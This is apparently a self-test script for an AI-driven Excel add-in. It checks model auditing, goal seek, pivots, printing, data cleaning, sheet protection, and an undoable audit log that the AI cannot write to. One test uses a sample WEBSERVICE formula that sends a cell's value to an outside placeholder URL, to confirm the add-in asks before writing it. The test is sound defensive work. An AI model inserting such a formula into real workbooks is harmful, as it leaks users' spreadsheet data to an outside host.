/* global Excel */
/** Tự kiểm tra Excel, phần Đợt 4: sửa biểu đồ và Pivot có sẵn, chuẩn bị in, tên vùng, kiểm toán mô hình, giải ngược, bảng nhạy cảm,
 *  hàm nguy hiểm, làm sạch dữ liệu, nhóm, bảo vệ, nhật ký và tô sáng. Chỉ đụng các sheet thử AIDN_KT_*; nhật ký thử ghi vào sheet
 *  riêng (không đụng "Nhật ký AI" thật) và không phụ thuộc cài đặt của người dùng. */
import { HostToolSet, UndoEntry } from "../core/agent/types";
import { HIGHLIGHT_COLOR } from "../core/auditlog";
import { withAuditTrail } from "./excelTrail";

interface Kit {
  /** Bộ công cụ Excel gốc (chưa bọc nhật ký) */
  base: HostToolSet;
  step: (name: string, fn: () => Promise<string | void>) => Promise<void>;
  expect: (cond: any, msg: string) => void;
  riskOf: (name: string, args: any) => Promise<string | null>;
}

export async function runExcelModelSelfTest({ base, step, expect, riskOf }: Kit): Promise<void> {
  const sfx = Date.now().toString(36).slice(-4);
  const M = "AIDN_KT_M_" + sfx;
  const NK = "AIDN_KT_NK_" + sfx;
  const NAME = "AIDN_KT_gia_dinh_" + sfx;
  const log: UndoEntry[] = [];
  const plain = withAuditTrail(base, { settings: () => ({}), describe: (c) => c.name });
  const run = (name: string, args: any = {}) => plain.execute(name, args, { log });
  let pivotSheet = "";
  let pivotName = "";

  const read = (address: string, what = "values") =>
    Excel.run(async (ctx) => {
      const r = ctx.workbook.worksheets.getItem(M).getRange(address);
      r.load(what);
      await ctx.sync();
      return (r as any)[what] as any[][];
    });

  await step("Đợt 4 · Dựng mô hình thử", async () => {
    await run("excel_add_sheet", { name: M });
    await run("excel_write_range", {
      sheet: M,
      address: "A1",
      values: [
        ["Chỉ tiêu", "Năm 1", "Năm 2", "Năm 3", "Năm 4", "Năm 5"],
        ["Doanh thu", "500", "=B2*(1+$B$8)", "590", "=D2*(1+$B$8)", "=E2*(1+$B$8)"],
        ["Chi phí", "=B2*$B$9", "=C2*$B$9", "=D2*$B$9", "=E2*$B$9", "=F2*$B$9"],
        ["Lợi nhuận gộp", "=B2-B3", "=C2-C3", "=D2-D3", "=E2-E3", "=F2-F3"],
        ["Quản lý", "=B2*0.05", "=C2*0.05", "=D2*0.05", "31", "=F2*0.05"],
        ["Lợi nhuận", "=B4-B5", "=C4-C5", "=D4-D5", "=E4-E3", "=F4-F5"],
        ["Tổng lợi nhuận", "=SUM(B6:F6)", "", "", "", ""],
        ["Tăng giá", "0.08", "", "", "", ""],
        ["Tỷ lệ chi phí", "0.62", "", "", "", ""],
        ["Thuế", "=B6*0.2", "82", "=D6*0.2", "=E6*0.2", "=F6*0.2"],
      ],
    });
    const v = await read("B7");
    expect(typeof v[0][0] === "number", `B7 không ra số: ${v[0][0]}`);
    return `Sheet ${M}, tổng lợi nhuận ${Math.round(v[0][0] * 100) / 100}`;
  });

  await step("Đợt 4 · Kiểm toán mô hình: cài 3 số gõ cứng + 1 công thức lệch, tìm đủ 4", async () => {
    const r = await run("excel_audit_model", { sheet: M });
    const hard = r.findings.filter((f: any) => f.kind === "hardcoded").map((f: any) => f.cell.split("!").pop());
    const odd = r.findings.filter((f: any) => f.kind === "inconsistent").map((f: any) => f.cell.split("!").pop());
    expect(hard.sort().join(",") === "C10,D2,E5", `Số gõ cứng tìm được: ${hard.join(",")} (cần C10, D2, E5)`);
    expect(odd.join(",") === "E6", `Công thức lệch tìm được: ${odd.join(",")} (cần E6)`);
    // Bản sạch: sửa 4 chỗ rồi kiểm lại, không còn báo
    await run("excel_write_range", { sheet: M, address: "D2", values: [["=C2*(1+$B$8)"]] });
    await run("excel_write_range", { sheet: M, address: "E5", values: [["=E2*0.05"]] });
    await run("excel_write_range", { sheet: M, address: "E6", values: [["=E4-E5"]] });
    await run("excel_write_range", { sheet: M, address: "C10", values: [["=C6*0.2"]] });
    const clean = await run("excel_audit_model", { sheet: M });
    expect(clean.counts.hardcoded === 0 && clean.counts.inconsistent === 0, `Bản đã sửa vẫn báo: ${clean.brief}`);
    expect(clean.counts.embedded_rate >= 2, "Chưa báo tỷ lệ gõ trong công thức (0.05, 0.2)");
    return `Bản cài lỗi: ${r.brief}. Bản đã sửa: 0 số gõ cứng, 0 công thức lệch`;
  });

  await step("Đợt 4 · Tên vùng: đặt, dùng trong công thức, liệt kê, xóa", async () => {
    const r = await run("excel_named_range", { action: "add", name: NAME, address: `${M}!B8` });
    await run("excel_write_range", { sheet: M, address: "H1", values: [[`=${r.name}*100`]] });
    const v = await read("H1");
    expect(Math.abs(v[0][0] - 8) < 1e-9, `H1 = ${v[0][0]}, cần 8`);
    const ls = await run("excel_list_objects", { sheet: M });
    expect(ls.names.some((n: any) => n.name === r.name), "Liệt kê không thấy tên vùng vừa đặt");
    const risk = await riskOf("excel_named_range", { action: "delete", name: r.name });
    expect(risk && /#NAME\?/.test(risk), `Xóa tên vùng không cảnh báo: ${risk}`);
    await run("excel_write_range", { sheet: M, address: "H1", values: [[""]] });
    await run("excel_named_range", { action: "delete", name: r.name });
    const ls2 = await run("excel_list_objects", { sheet: M });
    expect(!ls2.names.some((n: any) => n.name === r.name), "Tên vùng chưa bị xóa");
    return `${r.name} → ${r.address}; công thức =${r.name}*100 ra 8; đã xóa`;
  });

  await step("Đợt 4 · Giải ngược: đạt mục tiêu trong 0,1%, ô đầu vào về giá trị gốc", async () => {
    const before = await read("B7");
    const target = Math.round(before[0][0] * 1.2);
    const r = await run("excel_what_if", { mode: "goal_seek", input_cell: `${M}!B8`, target_cell: `${M}!B7`, target_value: target });
    expect(r.ok, `Không tìm được: ${r.error || r.message}`);
    const f = await read("B8", "formulas");
    const after = await read("B7");
    expect(f[0][0] === 0.08, `B8 sau khi giải ngược = ${f[0][0]}, cần giữ 0.08`);
    expect(after[0][0] === before[0][0], "B7 đã đổi sau khi giải ngược");
    // Kiểm bằng cách ghi thử đầu vào tìm được rồi trả lại
    await run("excel_write_range", { sheet: M, address: "B8", values: [[String(r.input_found)]] });
    const got = (await read("B7"))[0][0];
    await run("excel_write_range", { sheet: M, address: "B8", values: [["0.08"]] });
    const rel = Math.abs(got - target) / Math.abs(target);
    expect(rel <= 0.001, `Với B8 = ${r.input_found}, B7 = ${got}, lệch ${(rel * 100).toFixed(4)}% so với ${target}`);
    // Ô đầu vào là công thức thì từ chối
    let refused = "";
    try {
      await run("excel_what_if", { mode: "goal_seek", input_cell: `${M}!C2`, target_cell: `${M}!B7`, target_value: target });
    } catch (e: any) {
      refused = e.message;
    }
    expect(/công thức/.test(refused), "Ô đầu vào là công thức mà không bị từ chối");
    return `B8 = ${r.input_found} thì B7 = ${Math.round(got * 100) / 100} (mục tiêu ${target}, lệch ${(rel * 100).toFixed(4)}%, ${r.iterations} vòng); B8 vẫn 0,08`;
  });

  await step("Đợt 4 · Bảng nhạy cảm 2 biến, các ô về giá trị gốc", async () => {
    const r = await run("excel_what_if", { mode: "sensitivity", output_cell: `${M}!B7`, input_cell: `${M}!B8`, values: [0.05, 0.08, 0.1], input_cell_2: `${M}!B9`, values_2: [0.6, 0.62] });
    expect(r.table.length === 4 && r.table[0].length === 3, `Bảng sai kích thước: ${JSON.stringify(r.table).slice(0, 200)}`);
    const base0 = (await read("B7"))[0][0];
    expect(Math.abs(r.table[2][2] - base0) < 1e-6, `Ô (0,08; 0,62) = ${r.table[2][2]}, cần bằng hiện tại ${base0}`);
    expect(r.table[3][1] > r.table[1][1] && r.table[1][1] > r.table[1][2], "Số trong bảng không tăng theo giá, giảm theo chi phí");
    const f = await read("B8:B9", "formulas");
    expect(f[0][0] === 0.08 && f[1][0] === 0.62, `Ô đầu vào không về giá trị gốc: ${JSON.stringify(f)}`);
    return `3 × 2 phương án; B8, B9 vẫn 0,08 và 0,62`;
  });

  await step("Đợt 4 · Hỏi trước khi ghi công thức có hàm nguy hiểm", async () => {
    const a = await riskOf("excel_write_range", { sheet: M, address: "J1", values: [['=WEBSERVICE("http://example.com/?q="&A1)']] });
    expect(a && /WEBSERVICE/.test(a), `WEBSERVICE không được hỏi: ${a}`);
    const b = await riskOf("excel_write_range", { sheet: M, address: "J2", values: [['=INDIRECT("B"&2)']] });
    expect(b && /INDIRECT/.test(b), `INDIRECT không được hỏi: ${b}`);
    const c = await riskOf("excel_write_range", { sheet: M, address: "J3", values: [["=SUM(B2:B3)", 'Ghi chú: hàm INDIRECT( không dùng']] });
    expect(!c, `Hỏi nhầm với công thức thường: ${c}`);
    return "WEBSERVICE và INDIRECT: có hỏi; SUM và chữ thường: không hỏi";
  });

  await step("Đợt 4 · Sửa biểu đồ có sẵn: đổi kiểu và tiêu đề", async () => {
    const c = await run("excel_create_chart", { sheet: M, source_address: "A1:F3", chart_type: "column", title: "Cũ" });
    const r = await run("excel_edit_chart", { sheet: M, chart: c.chart, chart_type: "line", title: "Doanh thu và chi phí", y_axis_title: "Tỷ đồng", legend: "bottom" });
    const ls = await run("excel_list_objects", { sheet: M });
    const ch = ls.sheets[0].charts.find((x: any) => x.name === c.chart);
    expect(ch && /Line/.test(ch.type) && ch.title === "Doanh thu và chi phí", `Đọc lại biểu đồ: ${JSON.stringify(ch)}`);
    await log[log.length - 1].undo();
    log.pop();
    const ls2 = await run("excel_list_objects", { sheet: M });
    const ch2 = ls2.sheets[0].charts.find((x: any) => x.name === c.chart);
    expect(/Column/.test(ch2.type) && ch2.title === "Cũ", `Hoàn tác chưa trả lại biểu đồ: ${JSON.stringify(ch2)}`);
    return `${r.message}; Hoàn tác trả về cột, tiêu đề “Cũ”`;
  });

  await step("Đợt 4 · Biểu đồ từ cột nhãn và khối số nằm rời", async () => {
    const c = await run("excel_create_chart", { sheet: M, source_address: "A1:A6,E1:F6", chart_type: "bar", title: "Rời" });
    const n = await Excel.run(async (ctx) => {
      const s = ctx.workbook.worksheets.getItem(M).charts.getItem(c.chart).series;
      s.load("items/name");
      await ctx.sync();
      return s.items.map((x) => x.name).join(",");
    });
    expect(n === "Năm 4,Năm 5", `Chuỗi của biểu đồ: ${n}`);
    return `Hai chuỗi ${n}, nhãn lấy từ cột A`;
  });

  await step("Đợt 4 · Định dạng nhiều vùng rời trong một lệnh", async () => {
    await run("excel_format_range", { sheet: M, address: "B2:F2,B6:F6", bold: true });
    const b = await Excel.run(async (ctx) => {
      const ws = ctx.workbook.worksheets.getItem(M);
      const x = ws.getRange("B6").format.font;
      const y = ws.getRange("B4").format.font;
      x.load("bold");
      y.load("bold");
      await ctx.sync();
      return [x.bold, y.bold];
    });
    expect(b[0] === true && b[1] === false, `Đậm ở B6 / B4: ${b.join(" / ")}`);
    return "B2:F2 và B6:F6 đậm, hàng giữa không đổi";
  });

  await step("Đợt 4 · Thêm trường vào PivotTable có sẵn, lọc, làm mới", async () => {
    await run("excel_write_range", {
      sheet: M,
      address: "L1",
      values: [["Nhóm", "Quý", "Giá trị"], ["A", "Q1", "100"], ["B", "Q1", "200"], ["A", "Q2", "150"], ["B", "Q2", "250"]],
    });
    const p = await run("excel_create_pivot", { sheet: M, source_address: "L1:N5", rows: ["Nhóm"], values: [{ field: "Giá trị", summarize: "sum" }] });
    pivotSheet = p.sheet;
    pivotName = p.pivot;
    const r = await run("excel_edit_pivot", { pivot: pivotName, add_columns: ["Quý"], add_values: [{ field: "Giá trị", summarize: "average" }] });
    expect(r.columns.includes("Quý"), `Cột của Pivot: ${r.columns}`);
    expect(/Average/.test(r.values.join()), `Hàm tổng hợp: ${r.values}`);
    const fl = await run("excel_edit_pivot", { pivot: pivotName, filter: { field: "Nhóm", items: ["A"] } });
    const vals = await Excel.run(async (ctx) => {
      const rg = ctx.workbook.pivotTables.getItem(pivotName).layout.getRange();
      rg.load("values");
      await ctx.sync();
      return JSON.stringify(rg.values);
    });
    expect(/"A"/.test(vals) && !/"B"/.test(vals), `Sau lọc còn: ${vals.slice(0, 200)}`);
    await run("excel_edit_pivot", { pivot: pivotName, clear_filters: true, remove: ["Quý"], refresh: true });
    const ls = await run("excel_list_objects", { sheet: pivotSheet });
    const pv = ls.sheets[0].pivots[0];
    expect(pv && pv.columns.length === 0 && pv.rows.join() === "Nhóm", `Pivot sau khi bớt trường: ${JSON.stringify(pv)}`);
    return `${r.message}. ${fl.message}. Bớt lại còn hàng Nhóm`;
  });

  await step("Đợt 4 · Chuẩn bị in: vùng in, A4 ngang, vừa một trang ngang, dòng tiêu đề lặp", async () => {
    const r = await run("excel_page_setup", { sheet: M, print_area: "A1:F10", title_rows: "1:1", orientation: "landscape", paper: "A4", fit_width: 1, margins_cm: { top: 1.5, bottom: 1.5, left: 1, right: 1 }, footer: "Trang &P / &N" });
    const p = r.print;
    expect(p.print_area === "A1:F10", `Vùng in: ${p.print_area}`);
    expect(p.orientation === "landscape" && p.paper === "A4", `Hướng / khổ: ${p.orientation} / ${p.paper}`);
    expect(p.fit_width === 1 && !p.fit_height, `Co vừa: ${p.fit_width} × ${p.fit_height}`);
    expect(p.title_rows === "1:1", `Dòng tiêu đề lặp: ${p.title_rows}`);
    expect(Math.abs(p.margins_cm.left - 1) < 0.02 && p.footer === "Trang &P / &N", `Lề trái / chân trang: ${p.margins_cm.left} / ${p.footer}`);
    await log[log.length - 1].undo();
    log.pop();
    const ls = await run("excel_list_objects", { sheet: M });
    const q = ls.sheets[0].print;
    expect(q.orientation === "portrait" && !q.print_area && !q.title_rows && !q.fit_width, `Hoàn tác thiết lập in chưa sạch: ${JSON.stringify(q)}`);
    return `${r.message}; Hoàn tác trả về giấy dọc, không vùng in`;
  });

  await step("Đợt 4 · Làm sạch: xóa dòng trùng (có hỏi), thay hàng loạt, tự điền ngày", async () => {
    await run("excel_write_range", {
      sheet: M,
      address: "P1",
      values: [["Mã", "Tình trạng"], ["HS01", "Chờ"], ["HS02", "Chờ"], ["HS01", "Chờ"], ["HS03", "Xong"], ["HS02", "Chờ"]],
    });
    const risk = await riskOf("excel_clean_data", { action: "remove_duplicates", sheet: M, address: "P1:Q6", columns: ["P"] });
    expect(risk && /dòng trùng/.test(risk), `Xóa dòng trùng không hỏi: ${risk}`);
    const d = await run("excel_clean_data", { action: "remove_duplicates", sheet: M, address: "P1:Q6", columns: ["P"] });
    expect(d.removed === 2 && d.remaining === 3, `Xóa ${d.removed}, còn ${d.remaining}`);
    const rp = await run("excel_clean_data", { action: "replace_all", sheet: M, address: "P1:Q6", find: "Chờ", replace: "Đang xử lý" });
    expect(rp.replaced === 2, `Thay ${rp.replaced} chỗ, cần 2`);
    const v = await read("P1:Q4");
    expect(v[1][1] === "Đang xử lý" && v[3][0] === "HS03", `Sau làm sạch: ${JSON.stringify(v)}`);
    await run("excel_write_range", { sheet: M, address: "S1", values: [["1"], ["2"]] });
    const fs = await run("excel_clean_data", { action: "fill_series", sheet: M, address: "S1:S2", fill_to: "S1:S6" });
    const s = await read("S1:S6");
    expect(s.map((x) => x[0]).join(",") === "1,2,3,4,5,6", `Tự điền: ${s.map((x) => x[0]).join(",")}`);
    // Hoàn tác thay hàng loạt và xóa dòng trùng: bảng về 5 dòng dữ liệu ban đầu
    const entries = log.filter((u) => /Thay hàng loạt|Xóa dòng trùng/.test(u.label));
    for (const u of entries.reverse()) await u.undo();
    const back = await read("P1:Q6");
    expect(back[5][0] === "HS02" && back[1][1] === "Chờ", `Hoàn tác làm sạch chưa đúng: ${JSON.stringify(back)}`);
    return `${d.message}; ${rp.message}; ${fs.message}; Hoàn tác trả đủ 5 dòng`;
  });

  await step("Đợt 4 · Nhóm hàng rồi bỏ nhóm", async () => {
    const g = await run("excel_insert_delete", { sheet: M, action: "group_rows", at: "2", count: 2 });
    const lvl = await Excel.run(async (ctx) => {
      const ws = ctx.workbook.worksheets.getItem(M);
      ws.getRange("2:3").hideGroupDetails("ByRows" as any);
      await ctx.sync();
      const r = ws.getRange("A2");
      r.load("rowHidden");
      await ctx.sync();
      const h = r.rowHidden;
      ws.getRange("2:3").showGroupDetails("ByRows" as any);
      await ctx.sync();
      return h;
    });
    expect(lvl === true, "Thu gọn nhóm mà hàng 2 không ẩn: nhóm chưa được tạo");
    await run("excel_insert_delete", { sheet: M, action: "ungroup_rows", at: "2", count: 2 });
    return g.message;
  });

  await step("Đợt 4 · Khóa ô công thức, chừa ô nhập (không mật khẩu), rồi bỏ bảo vệ", async () => {
    const r = await run("excel_protect", { action: "lock_formulas", sheet: M });
    let blocked = "";
    try {
      await run("excel_write_range", { sheet: M, address: "C3", values: [["1"]] });
    } catch (e: any) {
      blocked = e.message;
    }
    expect(/bảo vệ/.test(blocked), `Ghi vào ô công thức không bị chặn (hoặc câu lỗi thiếu gợi ý): ${blocked}`);
    await run("excel_write_range", { sheet: M, address: "B8", values: [["0.09"]] });
    await run("excel_write_range", { sheet: M, address: "B8", values: [["0.08"]] });
    const risk = await riskOf("excel_protect", { action: "unprotect", sheet: M });
    expect(risk, "Bỏ bảo vệ không hỏi");
    await run("excel_protect", { action: "unprotect", sheet: M });
    await run("excel_write_range", { sheet: M, address: "C3", values: [["=C2*$B$9"]] });
    return `${r.message}; ghi ô công thức bị chặn, ghi ô nhập được; đã bỏ bảo vệ`;
  });

  await step("Đợt 4 · Nhật ký AI: 5 thao tác ghi → 5 dòng; tô sáng; Hoàn tác trả màu và ghi dòng hoàn tác", async () => {
    const tlog: UndoEntry[] = [];
    const trail = withAuditTrail(base, { settings: () => ({ excelLog: true, excelHighlight: true }), describe: (c) => `Ghi ${c.args?.address || c.name}`, logSheet: NK });
    const ctx = { log: tlog, said: "Cập nhật giả định theo yêu cầu", request: "Tự kiểm tra: đổi năm giả định" };
    await Excel.run(async (c) => {
      c.workbook.worksheets.getItem(M).getRange("U3").format.fill.color = "#00B050";
      await c.sync();
    });
    for (let i = 1; i <= 5; i++) await trail.execute("excel_write_range", { sheet: M, address: `U${i}`, values: [[i === 4 ? "=1+1" : String(i * 10)]] }, ctx);
    const rows = await Excel.run(async (c) => {
      const u = c.workbook.worksheets.getItem(NK).getUsedRange(true);
      u.load("values");
      await c.sync();
      return u.values;
    });
    expect(rows.length === 6, `Sheet nhật ký có ${rows.length - 1} dòng, cần 5`);
    const r3 = rows[3];
    expect(/^\d{2}\/\d{2}\/\d{4} \d{2}:\d{2}:\d{2}$/.test(String(r3[0])) && r3[1] === M && r3[2] === "U3" && String(r3[4]) === "30", `Dòng 3 của nhật ký: ${JSON.stringify(r3)}`);
    expect(/Cập nhật giả định/.test(String(r3[5])) && /đổi năm giả định/.test(String(r3[6])), `Thiếu lý do hoặc yêu cầu: ${JSON.stringify(r3)}`);
    expect(String(rows[4][4]) === "=1+1", `Công thức trong nhật ký phải là CHỮ "=1+1", nhận ${JSON.stringify(rows[4][4])}`);
    const fill = async (a: string) =>
      Excel.run(async (c) => {
        const f = c.workbook.worksheets.getItem(M).getRange(a).format.fill;
        f.load("color");
        await c.sync();
        return String(f.color).toUpperCase();
      });
    expect((await fill("U1")) === HIGHLIGHT_COLOR && (await fill("U3")) === HIGHLIGHT_COLOR, "Ô vừa ghi chưa được tô sáng");
    // AI không được ghi vào sheet nhật ký
    let refused = "";
    try {
      await trail.execute("excel_write_range", { sheet: NK, address: "A2", values: [["x"]] }, ctx);
    } catch (e: any) {
      refused = e.message;
    }
    expect(/nhật ký/.test(refused), "Ghi vào sheet nhật ký không bị từ chối");
    for (const u of tlog.slice().reverse()) await u.undo();
    const after = await Excel.run(async (c) => {
      const u = c.workbook.worksheets.getItem(NK).getUsedRange(true);
      u.load("values");
      const v = c.workbook.worksheets.getItem(M).getRange("U1:U5");
      v.load("values");
      await c.sync();
      return { rows: u.values, cells: v.values };
    });
    expect(after.rows.length === 11 && after.rows.slice(6).every((r) => /^Hoàn tác/.test(String(r[5]))), `Sau Hoàn tác nhật ký có ${after.rows.length - 1} dòng (cần 10, 5 dòng cuối là Hoàn tác)`);
    expect(after.cells.every((r) => r[0] === ""), "Ô chưa về trống sau Hoàn tác");
    const f1 = await fill("U1");
    const f3 = await fill("U3");
    expect(f1 !== HIGHLIGHT_COLOR && f3 === "#00B050", `Sau Hoàn tác: U1 ${f1 || "không màu"}, U3 ${f3} (cần về #00B050)`);
    return "5 dòng (giờ, sheet, ô, cũ, mới, lý do, yêu cầu); công thức ghi thành chữ; AI không ghi được vào nhật ký; Hoàn tác: thêm 5 dòng, ô hết tô sáng, màu cũ trở lại";
  });

  // Dọn: bỏ bảo vệ nếu còn, xóa sheet thử và tên vùng thử
  await Excel.run(async (ctx) => {
    const nm = ctx.workbook.names.getItemOrNullObject(NAME);
    await ctx.sync();
    if (!nm.isNullObject) nm.delete();
    for (const n of [pivotSheet, NK, M].filter(Boolean)) {
      const ws = ctx.workbook.worksheets.getItemOrNullObject(n);
      await ctx.sync();
      if (ws.isNullObject) continue;
      try {
        ws.protection.unprotect();
        await ctx.sync();
      } catch {
        /* không bảo vệ */
      }
      ws.delete();
      await ctx.sync();
    }
  }).catch(() => undefined);
}
